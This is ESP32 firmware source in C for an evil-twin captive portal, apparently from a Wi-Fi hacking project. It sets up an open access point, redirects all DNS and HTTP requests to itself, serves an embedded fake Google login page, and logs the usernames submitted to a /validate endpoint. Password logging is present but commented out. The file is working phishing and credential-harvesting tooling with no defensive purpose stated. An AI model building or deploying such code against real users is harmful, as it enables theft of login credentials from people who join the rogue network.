#include "captive_portal.h"
#include <sys/param.h>

#include "esp_event.h"
#include "esp_log.h"
#include "esp_mac.h"

#include "esp_netif.h"
#include "esp_wifi.h"
#include "lwip/inet.h"
#include "nvs_flash.h"

#include "dns_server.h"
#include "esp_http_server.h"
#include "portals/google.h"

#define EXAMPLE_ESP_WIFI_SSID "Hacknet_EXT"  //"NotSuspiciousAP"
#define EXAMPLE_ESP_WIFI_PASS ""
#define EXAMPLE_MAX_STA_CONN  4

extern const char root_start[] asm("_binary_google_html_start");
extern const char root_end[] asm("_binary_google_html_end");

static const char* TAG = "captive_portal";

static void wifi_event_handler(void* arg,
                               esp_event_base_t event_base,
                               int32_t event_id,
                               void* event_data) {
  if (event_id == WIFI_EVENT_AP_STACONNECTED) {
    wifi_event_ap_staconnected_t* event =
        (wifi_event_ap_staconnected_t*) event_data;
    ESP_LOGI(TAG, "station " MACSTR " join, AID=%d", MAC2STR(event->mac),
             event->aid);
  } else if (event_id == WIFI_EVENT_AP_STADISCONNECTED) {
    wifi_event_ap_stadisconnected_t* event =
        (wifi_event_ap_stadisconnected_t*) event_data;
    ESP_LOGI(TAG, "station " MACSTR " leave, AID=%d", MAC2STR(event->mac),
             event->aid);
  }
}

static void wifi_init_softap(void) {
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  ESP_ERROR_CHECK(esp_wifi_init(&cfg));

  ESP_ERROR_CHECK(esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID,
                                             &wifi_event_handler, NULL));

  wifi_config_t wifi_config = {
      .ap = {.ssid = EXAMPLE_ESP_WIFI_SSID,
             .ssid_len = strlen(EXAMPLE_ESP_WIFI_SSID),
             .password = "",
             .max_connection = EXAMPLE_MAX_STA_CONN,
             .authmode = WIFI_AUTH_WPA_WPA2_PSK},
  };
  if (strlen(EXAMPLE_ESP_WIFI_PASS) == 0) {
    wifi_config.ap.authmode = WIFI_AUTH_OPEN;
  }

  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
  ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, &wifi_config));
  ESP_ERROR_CHECK(esp_wifi_start());

  esp_netif_ip_info_t ip_info;
  esp_netif_get_ip_info(esp_netif_get_handle_from_ifkey("WIFI_AP_DEF"),
                        &ip_info);

  char ip_addr[16];
  inet_ntoa_r(ip_info.ip.addr, ip_addr, 16);
  ESP_LOGI(TAG, "Set up softAP with IP: %s", ip_addr);

  ESP_LOGI(TAG, "wifi_init_softap finished. SSID:'%s' password:'%s'",
           EXAMPLE_ESP_WIFI_SSID, EXAMPLE_ESP_WIFI_PASS);
}

// HTTP GET Handler
static esp_err_t root_get_handler(httpd_req_t* req) {
  const uint32_t root_len = root_end - root_start;

  ESP_LOGI(TAG, "Serve root");
  httpd_resp_set_type(req, "text/html");
  httpd_resp_send(req, root_start, root_len);

  return ESP_OK;
}
// HTTP GET Handler user creds
// params: user, pass
static esp_err_t validate_get_handler(httpd_req_t* req) {
  char* buf;
  size_t buf_len;
  buf_len = httpd_req_get_url_query_len(req) + 1;
  if (buf_len > 1) {
    buf = (char*) malloc(buf_len);
    if (httpd_req_get_url_query_str(req, buf, buf_len) == ESP_OK) {
      char param[32];
      if (httpd_query_key_value(buf, "user", param, sizeof(param)) == ESP_OK) {
        ESP_LOGI(TAG, "Found URL query parameter -> user: %s", param);
      }
      // if (httpd_query_key_value(buf, "pass", param, sizeof(param)) == ESP_OK)
      // {
      //   ESP_LOGI(TAG, "Found URL query parameter -> pass: %s", param);
      // }
    }
  }
  return ESP_OK;
}

static const httpd_uri_t root = {.uri = "/",
                                 .method = HTTP_GET,
                                 .handler = root_get_handler};

static const httpd_uri_t get_creds = {.uri = "/validate",
                                      .method = HTTP_GET,
                                      .handler = validate_get_handler};

// HTTP Error (404) Handler - Redirects all requests to the root page
esp_err_t http_404_error_handler(httpd_req_t* req, httpd_err_code_t err) {
  // Set status
  httpd_resp_set_status(req, "302 Temporary Redirect");
  // Redirect to the "/" root directory
  httpd_resp_set_hdr(req, "Location", "/");
  // iOS requires content in the response to detect a captive portal, simply
  // redirecting is not sufficient.
  httpd_resp_send(req, "Redirect to the captive portal", HTTPD_RESP_USE_STRLEN);

  ESP_LOGI(TAG, "Redirecting to root");
  return ESP_OK;
}

static httpd_handle_t start_webserver(void) {
  httpd_handle_t server = NULL;
  httpd_config_t config = HTTPD_DEFAULT_CONFIG();
  config.max_open_sockets = 13;
  config.lru_purge_enable = true;

  // Start the httpd server
  ESP_LOGI(TAG, "Starting server on port: '%d'", config.server_port);
  if (httpd_start(&server, &config) == ESP_OK) {
    // Set URI handlers
    ESP_LOGI(TAG, "Registering URI handlers");
    httpd_register_uri_handler(server, &root);
    httpd_register_uri_handler(server, &get_creds);
    httpd_register_err_handler(server, HTTPD_404_NOT_FOUND,
                               http_404_error_handler);
  }
  return server;
}

void captive_portal_begin() {
  esp_log_level_set("httpd_uri", ESP_LOG_ERROR);
  esp_log_level_set("httpd_txrx", ESP_LOG_ERROR);
  esp_log_level_set("httpd_parse", ESP_LOG_ERROR);

  ESP_ERROR_CHECK(esp_netif_init());
  esp_netif_create_default_wifi_ap();
  wifi_init_softap();
  start_webserver();

  // Start the DNS server that will redirect all queries to the softAP IP
  dns_server_config_t config = DNS_SERVER_CONFIG_SINGLE(
      "*" /* all A queries */, "WIFI_AP_DEF" /* softAP netif ID */);
  start_dns_server(&config);
}
